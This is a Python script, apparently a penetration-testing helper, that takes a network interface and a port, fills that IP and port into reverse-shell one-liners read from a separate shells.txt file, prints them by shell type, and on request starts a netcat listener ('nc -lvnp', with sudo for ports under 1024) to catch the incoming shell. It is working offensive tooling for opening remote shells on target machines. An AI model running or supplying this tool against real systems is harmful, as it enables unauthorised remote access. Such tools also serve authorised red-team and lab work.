#!/usr/bin/env python3

from sys import argv, exit as exit_code
from os import system, path
from re import search
from subprocess import check_output

def GREEN(text):
    return "\033[32m{}\033[0m".format(str(text))

def usage():
    print('''Usage: python3 {} <interface> <port> [shell type]
Examples:
    python3 {} eth0 4444
    python3 {} eth0 4444 bash'''.format(argv[0],argv[0],argv[0]))
    exit_code(-1)

def get_ip(interface):
    if interface == 'all':
        return '0.0.0.0'
    output = check_output(['ifconfig',interface]).decode()
    res = search('\d+.\d+.\d+.\d+',output)
    if res == None:
        print("Interface not valid or no IP address! Exiting.")
        exit_code(-1)
    else:
        return res.group(0)
    
def main():
    if len(argv) < 3:
        usage()

    interface, port = argv[1], argv[2]
    ipaddr = get_ip(interface)
    shells = path.join(path.dirname(path.realpath(__file__)), 'shells.txt')
    if len(argv) == 4:
        shell_type = argv[3].upper()
    else:
        shell_type = ''
    for shell in open(shells):
        desc, cmd = shell.split('|', 1)
        cmd = cmd.replace("[IPADDR]", ipaddr)
        cmd = cmd.replace("[PORT]", port)
        if shell_type in desc:
            print(GREEN(desc))
            print(cmd)

    c = input('Select your payload, press "l" to listen on that port or enter to exit: ')
    if c == 'l':
        if int(port) < 1024:
            system('sudo nc -s {} -lvnp {}'.format(ipaddr, port))
        else:
            system('nc -s {} -lvnp {}'.format(ipaddr, port))

if __name__ == "__main__":
    main()
